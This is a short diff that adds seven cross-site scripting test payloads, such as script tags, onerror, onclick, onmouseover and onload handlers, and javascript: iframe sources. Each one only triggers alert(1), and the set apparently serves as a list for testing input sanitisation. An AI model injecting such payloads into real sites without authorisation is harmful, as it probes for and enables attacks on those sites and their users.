@@ -1,0 +1,7 @@
+<script>alert(1)</script>
+<img src=# onerror=alert(1)>
+<input type=button onclick=alert(1)>
+<input type=button onmouseup=alert(1)>
+<input type=button onmouseover=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src=# onload=alert(1)></iframe>
